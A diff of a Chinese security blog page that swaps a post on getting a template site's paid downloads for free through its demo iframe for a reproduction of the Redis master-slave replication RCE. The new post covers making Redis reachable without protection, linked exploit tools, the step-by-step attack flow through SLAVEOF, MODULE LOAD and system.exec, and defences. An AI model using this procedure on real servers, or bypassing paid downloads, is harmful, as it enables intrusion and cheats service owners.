@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>逻辑绕过某站下载网页素材 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="逻辑绕过某站下载网页素材 | 九世的博客">
+  <title>Redis-RCE复现 | 九世的博客</title>
+  <meta name="keywords" content=" 漏洞复现 ">
+  <meta name="description" content="Redis-RCE复现 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1267,9 +1267,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-逻辑绕过某站下载网页素材" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-Redis-RCE复现" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">逻辑绕过某站下载网页素材</h1>
+        <h1 class="article-title">Redis-RCE复现</h1>
     
     <div class="article-meta">
         
@@ -1278,14 +1278,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color5">漏洞复现</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-04-19 20:36:16">2019-04-06 16:37</time>
+        创建时间:<time class="date" title="更新时间: 2020-01-21 17:42:50">2020-01-21 16:24</time>
         
     </div>
     <div class="article-meta">
@@ -1307,7 +1307,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li></ol><li class="toc-item toc-level-2"><a class="toc-link" href="#正文"><span class="toc-text">正文</span></a>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#造成漏洞的原因"><span class="toc-text">造成漏洞的原因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现"><span class="toc-text">复现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#利用点"><span class="toc-text">利用点</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#防御"><span class="toc-text">防御</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1319,18 +1319,36 @@
         display: none !important;
     }
 </style>
-</li></div>
+</div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近开了个坑，想用django写个项目..然后发现那个前端，那个前端啊。真是恶意极强，真的是佛了后面找到某素材站。还要钱下载，我。。。祝你清明节快乐<br><img src="https://img3.hackhome.com/img2018/4/24/16/543838169.jpg" alt="543838169.jpg"></p>
-<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>素材站：<a href="http://www.17sucai.com" target="_blank" rel="noopener">jQuery网页特效最全网页模板和网站模板jQuery代码_17素材网</a><br>一开始想去挖他看看有没有逻辑充值，然后发现后端做了效验<br><img src="https://s2.ax1x.com/2019/04/06/AWHAMD.png" alt="AWHAMD.png"></p>
-<p><img src="https://s2.ax1x.com/2019/04/06/AWHHwd.md.png" alt="AWHHwd.md.png"></p>
-<p>提交表单之后发现还是50块。。。emmm，然后就想着下载能不能搞搞<br>发现也是后端判断的。。我草</p>
-<p>回归到素材那页，发现除了下载还有个演示功能（！= =）<br><img src="https://s2.ax1x.com/2019/04/06/AWO1ts.png" alt="AWO1ts.png"></p>
-<p>打开一看，源码一查iframe嵌套进去的。。。直接打开这个html下载完事…<br><img src="https://s2.ax1x.com/2019/04/06/AWO2nO.md.png" alt="AWO2nO.md.png"></p>
-<p>访问，然后下载保存就完事了..<br><img src="https://s2.ax1x.com/2019/04/06/AWO4Nd.md.png" alt="AWO4Nd.md.png"></p>
-<p>随便说一下:我现在一般把笔记全部放在<a href="https://github.com/422926799/note" target="_blank" rel="noopener">https://github.com/422926799/note</a></p>
-<p>转载请声明：转自422926799.github.io</p>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近有点沉迷于B站….草了狗。还是学习吧<br><img src="https://timgsa.baidu.com/timg?image&amp;quality=80&amp;size=b9999_10000&amp;sec=1579605325992&amp;di=f29b807ed67a97ea5df63dc2c8a366a0&amp;imgtype=0&amp;src=http%3A%2F%2Fb-ssl.duitang.com%2Fuploads%2Fblog%2F201508%2F25%2F20150825090550_vBntQ.jpeg" alt=""></p>
+<h2 id="造成漏洞的原因"><a href="#造成漏洞的原因" class="headerlink" title="造成漏洞的原因"></a>造成漏洞的原因</h2><blockquote>
+<p>通过主从复制 GetShell<br>在介绍这种利用方式之前，首先我们需要介绍一下什么是主从复制和redis的模块。<br>Redis主从复制<br>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机，其他实例都作为备份机，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+</blockquote>
+<h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><pre><code>apt install redis-server
+</code></pre><p>修改/etc/redis/redis.conf</p>
+<pre><code>bind 127.0.0.1 -&gt; bind 0.0.0.0
+protected-mode -yes -&gt; protected-mode no
+</code></pre><p>exp地址：</p>
+<pre><code>https://github.com/Ridter/redis-rce - 利用工具
+https://github.com/n0b0dyCN/redis-rogue-server/blob/master/exp.so - exp.so
+</code></pre><p><img src="https://s2.ax1x.com/2020/01/21/1kCbPf.png" alt=""></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>那么实现shell的过程中实现了什么？先从py下手</p>
+<pre><code>1.读取exp.so
+2.调用runserver函数处理  runserver(options.rhost, options.rport, options.lhost, options.lport) #目标IP、目标端口、attack IP、attack监听的端口（默认监听21000端口）
+3.调用Remote.do() #发送Redis密码验证，并返回结果，如果返回invalid password代表密码错误
+4.密码正确，redis登录成功后，发送info指令查看redis数据库详细信息
+5.发送SLAVEOF指令，指令格式 SLAVEOF host port。作用通过执行 SLAVEOF host port 命令，可以将当前服务器转变为指定服务器的从属服务器(slave server)，这里的host和port则指向attack的IP和端口
+6.发送CONFIG SET dbfilename &lt;name&gt; 设置文件名称(根据exp.so的文件名来设置的文件名，比如exp.so。设置的dbfilename就是exp)
+7.监听本机21000端口，等待redis回传的数据。根据返回的结果将exp转换成bytes，发送exp
+8.MODULE LOAD指令加载exp.so
+9.取消从属服务器
+10.根据选择是进入shell或者执行其他指令
+12.若是执行shell指令，则调用exp.so里面的system.exec函数后面跟上命令。system.exec &lt;command&gt;
+</code></pre><p>总的来说是，设置从属服务器后。在设置dbfilename，之后发送shellcode。应该是被Redis-Server保存了。然后加载扩展，调用system.exec函数执行命令。</p>
+<h2 id="利用点"><a href="#利用点" class="headerlink" title="利用点"></a>利用点</h2><p>1.低权的时候，redis以root权限运行。通过RCE获得root权限<br>2.未授权直接利用</p>
+<h2 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h2><p>1.设置本机才能访问<br>2.设置复杂性密码<br>3.Redis-server不以root权限运行</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1340,12 +1358,12 @@
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>逻辑绕过某站下载网页素材</p>
+    <p><span class="copy-title">文章标题:</span>Redis-RCE复现</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-04-06, 16:37:17</p>
-    <p><span class="copy-title">最后更新:</span>2019-04-19, 20:36:16</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/8eec787.html" title="逻辑绕过某站下载网页素材">http://422926799.github.io/posts/8eec787.html</a>
+    <p><span class="copy-title">发布时间:</span>2020-01-21, 16:24:51</p>
+    <p><span class="copy-title">最后更新:</span>2020-01-21, 17:42:50</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/ac34060e.html" title="Redis-RCE复现">http://422926799.github.io/posts/ac34060e.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
